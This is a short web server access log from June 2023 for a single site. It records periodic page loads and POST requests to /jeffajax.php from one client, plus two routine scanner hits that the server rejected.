144.217.207.28 - - [06/Jun/2023:02:29:45 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:02:34:40 -0400] "GET / HTTP/2.0" 200 80756 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:02:34:44 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
68.183.195.136 - - [06/Jun/2023:02:37:13 -0400] "POST /wsman HTTP/2.0" 404 196 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:02:39:40 -0400] "GET / HTTP/2.0" 200 80756 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:02:39:43 -0400] "GET /assets/js/main.js HTTP/2.0" 304 - "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:02:39:44 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:02:44:40 -0400] "GET / HTTP/2.0" 200 80756 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:02:44:45 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:02:49:40 -0400] "GET / HTTP/2.0" 200 80756 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:02:49:43 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
198.235.24.42 - - [06/Jun/2023:02:53:06 -0400] "\x16\x03\x01" 400 226 "-" "-"
144.217.207.28 - - [06/Jun/2023:02:54:40 -0400] "GET / HTTP/2.0" 200 80756 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [06/Jun/2023:02:54:44 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
